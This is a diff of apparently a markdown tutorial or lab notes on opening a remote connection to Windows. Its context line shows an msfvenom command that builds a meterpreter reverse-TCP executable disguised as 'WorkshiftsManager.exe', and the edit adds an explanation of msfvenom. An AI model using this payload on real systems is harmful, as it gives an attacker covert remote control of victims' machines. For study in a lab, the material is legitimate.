@@ -139,7 +139,7 @@ To open a remote desktop connection, we can use the following command directly f
 
     `msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp  LHOST=10.0.2.15 -b "\x00" -f exe -o ./Desktop/WorkshiftsManager.exe`
 
-	 `msfvenom` is a 
+	 `msfvenom` is a pre-installed payload generator and encoder available on Kali, through which we build a `.exe` file executable on all Windows devices
 	
  7. dd
  8. gg
@@ -154,11 +154,11 @@ To open a remote desktop connection, we can use the following command directly f
 
 
 <!--stackedit_data:
-eyJoaXN0b3J5IjpbLTE3MDg4MDQ4NDcsLTE4NjcxMzM0NTIsNz
-MxNjg1MzE3LDE3MDA1MzQ1NjAsMTIzMTc4MDc0OSwxMjM4MjI4
-MjQ2LC0xMDg3MzM5MjQyLC0xODE5ODE1MjkyLDI3MTczNDQ0Ni
-w5MDcwMzI3OCwxNzM2Mzk3OTcyLDEyMTIyNDQxNDMsMTU2NTgw
-MDI4NywtMjkyNTQzOTM0LC0xNDQ3Mzg4MzYwLC0yMDk3Njc4OD
-YzLDEwOTYxODAxMTUsLTE4MTQ1NzI5MDgsLTIxMTIwMTA1ODgs
-LTQ3Mjg2OTkzN119
+eyJoaXN0b3J5IjpbNDMzNDIzOTM5LC0xNzA4ODA0ODQ3LC0xOD
+Y3MTMzNDUyLDczMTY4NTMxNywxNzAwNTM0NTYwLDEyMzE3ODA3
+NDksMTIzODIyODI0NiwtMTA4NzMzOTI0MiwtMTgxOTgxNTI5Mi
+wyNzE3MzQ0NDYsOTA3MDMyNzgsMTczNjM5Nzk3MiwxMjEyMjQ0
+MTQzLDE1NjU4MDAyODcsLTI5MjU0MzkzNCwtMTQ0NzM4ODM2MC
+wtMjA5NzY3ODg2MywxMDk2MTgwMTE1LC0xODE0NTcyOTA4LC0y
+MTEyMDEwNTg4XX0=
 -->
